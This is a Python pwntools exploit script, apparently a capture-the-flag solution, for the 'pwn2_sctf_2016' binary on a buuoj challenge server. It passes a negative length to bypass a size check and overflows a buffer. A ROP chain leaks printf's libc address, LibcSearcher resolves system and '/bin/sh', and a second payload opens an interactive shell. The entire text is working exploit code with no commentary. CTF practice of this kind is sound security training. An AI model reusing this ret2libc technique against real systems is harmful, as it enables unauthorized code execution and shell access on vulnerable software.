from pwn import *
import time
from LibcSearcher import *

context(arch="i386", os="linux", log_level="debug")

# io = remote("192.168.95.131",10001)
io = remote("node4.buuoj.cn",25127)
elf = ELF("./pwn2_sctf_2016")

main_addr = elf.symbols["main"]
printf_addr_got = elf.got["printf"]
printf_addr_plt = elf.plt["printf"]

io.recvuntil(b"How many bytes do you want me to read?")
pause()
io.sendline(b"-1")
io.recvuntil(b"Ok, sounds good. Give me 4294967295 bytes of data!")
payload = flat(b"A"*0x30,printf_addr_plt,main_addr,printf_addr_got)
pause()
io.sendline(payload)

print(io.recvuntil(b"AAAA"))
print(io.recvuntil(b"\n"))
real_printf_addr = io.recvuntil(b"How many bytes")
real_printf_addr = real_printf_addr.replace(b"How many bytes",b"")
print(real_printf_addr)
# real_printf_addr = real_printf_addr.ljust(4,b"\x00")
real_printf_addr = real_printf_addr[0:4]
real_printf_addr = real_printf_addr.ljust(4,b"\x00")
real_printf_addr = u32(real_printf_addr)
print(hex(real_printf_addr))

origin_addr = LibcSearcher("printf", real_printf_addr)
base_addr = real_printf_addr - origin_addr.dump("printf")
bin_sh_real_addr = base_addr + origin_addr.dump("str_bin_sh")
system_real_addr = base_addr + origin_addr.dump("system")



# print(hex(real_printf_addr))
print(io.recvuntil(b"do you want me to read?"))
io.sendline(b"-1")
io.recvuntil(b"bytes of data!")
payload = flat(b"A"*0x30,system_real_addr,main_addr,bin_sh_real_addr)
pause()
io.sendline(payload)
io.recv()
io.interactive()